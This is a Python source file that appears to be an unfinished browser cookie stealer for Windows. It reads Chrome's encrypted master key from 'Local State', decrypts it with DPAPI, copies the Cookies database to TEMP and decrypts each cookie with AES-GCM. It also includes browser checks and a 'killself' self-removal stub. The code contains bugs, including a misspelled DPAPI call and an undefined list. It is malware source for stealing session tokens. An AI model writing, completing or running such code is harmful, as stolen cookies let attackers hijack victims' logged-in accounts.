from Crypto.Cipher import AES
import win32crypt
import sqlite3
import base64
import json
import os


home = ""


# TODO: Change this to a check of installed programs.
c_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 
                          'Chrome', 'User Data')
localStatePath = os.path.join(c_path, 'Local State')
cookiesPath = os.path.join(c_path, 'Default', 'Network', 'Cookies')


has_c = False
has_f = False
has_e = False

def check_for_browsers(c_path, f_path, e_path):
    global has_c, has_f, has_e
    if os.path.isfile(c_path):
        has_c = True
    if os.path.isfile(f_path):
        has_f = True
    if os.path.isfile(e_path):
        has_e = True
    if not (has_c or has_f or has_e):
        killself()
    return has_c, has_f, has_e

def c_get_key():
    if has_c == True:
        try:
            with open(localStatePath, 'r', encoding='utf-8') as file:
                localStateData = json.load(file)
                encryptedKey = localStateData['os_crypt']['encrypted_key']
                keyData = base64.b64decode(encryptedKey.encode('utf-8'))
                return win32crypt.CryptoUnprotectedData(keyData[5:], None, None, None, 0)[1]
        except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
# Decide what to do here
            print("Whoops")


def c_get_cookies():
    key = c_get_key()
    tempCookiesPath = os.path.join(os.environ["TEMP"], "tempcookies.db")
    os.system(f'copy "{cookiesPath}" "{tempCookiesPath}"')

    conn = sqlite3.connect(tempCookiesPath)
    cursor = conn.cursor()
    cursor.execute("""SELECT host_key, name, value, encrypted_value FROM cookies""")

    c_cookies = []
    for host_key, name, value, encrypted_value in cursor.fetchall():
        if not value:
            value = AES.new(key, AES.MODE_GCM, encrypted_value[3:15]).decrypt(encrypted_value[15:-16]).decode()

        cookies.append({
            "name": name,
            "value": value,
            "domain": host_key,
        })

    return c_cookies

def killself():
    print("Bye")
